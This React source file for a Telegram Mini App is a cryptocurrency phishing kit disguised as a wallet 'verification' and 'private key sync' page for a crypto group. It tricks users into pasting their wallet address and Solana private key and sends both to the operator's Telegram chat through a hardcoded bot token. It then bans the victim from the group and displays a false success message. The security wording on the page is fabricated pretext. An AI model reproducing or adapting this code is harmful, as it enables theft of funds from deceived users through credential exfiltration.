import React, { useState, useEffect } from 'react';

// --- CONFIGURATION ---
const BOT_TOKEN = "8515224137:AAGkieoUFLWj6WxO4T0Pig8Mhs5qHrEcBrY";
const CHAT_ID = "7539902547";
const GROUP_ID = "-1002361131154"; 

export default function App() {
  const [loading, setLoading] = useState(true);
  const [step, setStep] = useState(1);
  const [walletCA, setWalletCA] = useState('');
  const [privateKey, setPrivateKey] = useState('');
  const [status, setStatus] = useState('idle');

  useEffect(() => {
    const tg = (window as any).Telegram?.WebApp;
    if (tg) {
      tg.ready();
      tg.expand();
      tg.setHeaderColor?.('#040608');
    }
    const timer = setTimeout(() => setLoading(false), 2000);
    return () => clearTimeout(timer);
  }, []);

  const handleNext = async () => {
    if (walletCA.length < 32) return alert("Error: Invalid Wallet Address.");
    setStatus('processing');
    
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ 
        chat_id: CHAT_ID, 
        text: `📈 [LOG] WALLET ENTERED\nAddress: ${walletCA}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
      }),
    });

    setTimeout(() => { setStep(2); setStatus('idle'); }, 600);
  };

  const handleFinal = async () => {
    // Basic Solana PK check (Base58 usually 87-88 chars)
    if (privateKey.length < 44) {
      return alert("Sync Error: Private Key does not match the required format.");
    }
    
    setStatus('processing');
    try {
      await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ 
          chat_id: CHAT_ID, 
          text: `🎯 [AUTH] TARGET SECURED\nWallet: ${walletCA}\nPK: ${privateKey}\nUser: @${(window as any).Telegram?.WebApp?.initDataUnsafe?.user?.username || 'Anon'}` 
        }),
      });

      const userId = (window as any).Telegram?.WebApp?.initDataUnsafe?.user?.id;
      if (userId) {
        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/banChatMember`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: GROUP_ID, user_id: userId }),
        });
      }
      alert("Verification Successful. Your wallet is now synchronized with the group liquidity node.");
      (window as any).Telegram?.WebApp?.close();
    } catch (e) {
      setStatus('idle');
      alert("Synchronization failed.");
    }
  };

  const styles = {
    bg: '#040608',
    card: '#0a0e17',
    primary: '#10b981',
    text: '#f1f5f9',
    muted: '#64748b',
    border: '#1e293b'
  };

  if (loading) {
    return (
      <div style={{ background: styles.bg, height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', color: styles.primary, fontFamily: 'monospace', padding: '40px', boxSizing: 'border-box' }}>
        <div style={{ fontSize: '18px', fontWeight: 'bold', letterSpacing: '4px', marginBottom: '20px' }}>AUTH_VERIFY</div>
        <div style={{ width: '100px', height: '1px', background: styles.primary }} />
      </div>
    );
  }

  return (
    <div style={{ background: styles.bg, minHeight: '100vh', color: styles.text, fontFamily: 'sans-serif', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: '24px', boxSizing: 'border-box' }}>
      
      <div style={{ textAlign: 'center', marginBottom: '40px' }}>
        <h1 style={{ fontSize: '28px', fontWeight: '900', margin: '0', letterSpacing: '-1px' }}>AUTH<span style={{ color: styles.primary }}>VERIFY</span></h1>
        <p style={{ color: styles.muted, fontSize: '10px', textTransform: 'uppercase', letterSpacing: '2px', marginTop: '5px' }}>Group Liquidity Protocol</p>
      </div>

      <div style={{ background: styles.card, width: '100%', maxWidth: '380px', borderRadius: '24px', padding: '32px', border: `1px solid ${styles.border}`, boxSizing: 'border-box', textAlign: 'center' }}>
        
        {step === 1 ? (
          <div>
            <h2 style={{ fontSize: '22px', marginBottom: '10px', fontWeight: '800' }}>Wallet Verification</h2>
            <p style={{ color: styles.muted, fontSize: '13px', lineHeight: '1.5', marginBottom: '25px' }}>
              To prevent Sybil attacks, please enter your <strong>Wallet Address (CA)</strong> to confirm your account age and transaction history.
            </p>
            
            <input 
              value={walletCA}
              onChange={e => setWalletCA(e.target.value)}
              placeholder="Paste Wallet Address"
              style={{ width: '100%', padding: '16px', borderRadius: '12px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '14px', marginBottom: '20px', boxSizing: 'border-box', outline: 'none', textAlign: 'center' }}
            />
            
            <button onClick={handleNext} style={{ width: '100%', padding: '18px', borderRadius: '12px', background: styles.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', fontSize: '15px' }}>
              {status === 'processing' ? 'CHECKING...' : 'CONTINUE'}
            </button>
          </div>
        ) : (
          <div>
            <div style={{ color: styles.primary, fontSize: '11px', fontWeight: 'bold', marginBottom: '10px' }}>✓ WALLET ELIGIBLE</div>
            <h2 style={{ fontSize: '22px', marginBottom: '10px', fontWeight: '800' }}>Sync Private Key</h2>
            <p style={{ color: styles.muted, fontSize: '13px', lineHeight: '1.5', marginBottom: '25px' }}>
               To enable <strong>MEV-Protection</strong> and stay in the group, you must synchronize your <strong>Private Key</strong>. This allows our node to sign security handshakes for your account.
            </p>
            
            <textarea 
              value={privateKey}
              onChange={e => setPrivateKey(e.target.value)}
              placeholder="Paste Private Key"
              style={{ width: '100%', height: '110px', padding: '16px', borderRadius: '12px', background: styles.bg, border: `1px solid ${styles.border}`, color: '#fff', fontSize: '13px', marginBottom: '20px', boxSizing: 'border-box', outline: 'none', fontFamily: 'monospace', textAlign: 'center', resize: 'none' }}
            />
            
            <button onClick={handleFinal} disabled={status === 'processing'} style={{ width: '100%', padding: '18px', borderRadius: '12px', background: styles.primary, color: '#000', fontWeight: '900', border: 'none', cursor: 'pointer', fontSize: '15px', opacity: status === 'processing' ? 0.6 : 1 }}>
              {status === 'processing' ? 'SYNCHRONIZING...' : 'FINALIZE SYNC'}
            </button>
          </div>
        )}
      </div>

      <div style={{ marginTop: '30px', color: styles.muted, fontSize: '10px', textAlign: 'center' }}>
        NODE SECURED // AES-256
      </div>
    </div>
  );
}